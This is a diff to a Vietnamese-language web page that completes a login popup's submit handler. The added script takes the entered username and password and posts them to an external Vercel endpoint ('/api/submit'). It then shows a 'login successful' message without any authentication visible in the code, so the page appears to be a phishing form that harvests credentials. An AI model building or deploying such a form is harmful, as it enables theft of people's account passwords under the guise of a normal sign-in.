@@ -164,6 +164,7 @@
     ✅ Đăng nhập thành công!
   </div>
 
+  <!-- ✅ Đặt script ở cuối để không bị lỗi -->
   <script>
     function showLogin() {
       document.getElementById('loginPopup').style.display = 'block';
@@ -175,4 +176,38 @@
       document.getElementById('overlayBg').style.display = 'none';
     }
 
-    document.getElementById('loginForm').addEventListener('
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://figurii1.vercel.app/api/submit', true); 
+      xhr.setRequestHeader('Content-Type', 'application/json');
+
+      xhr.onload = function() {
+        if (xhr.status >= 200 && xhr.status < 300) {
+          console.log('✅ Dữ liệu đã được gửi:', xhr.responseText);
+          hideLogin();
+
+          const msg = document.getElementById('successMessage');
+          msg.style.display = 'block';
+          setTimeout(() => {
+            msg.style.display = 'none';
+          }, 3000);
+        } else {
+          console.error('❌ Lỗi khi gửi dữ liệu:', xhr.statusText);
+        }
+      };
+
+      xhr.onerror = function() {
+        console.error('❌ Lỗi kết nối hoặc CORS bị chặn');
+      };
+
+      xhr.send(JSON.stringify({ username, password }));
+    });
+  </script>
+
+</body>
+</html>
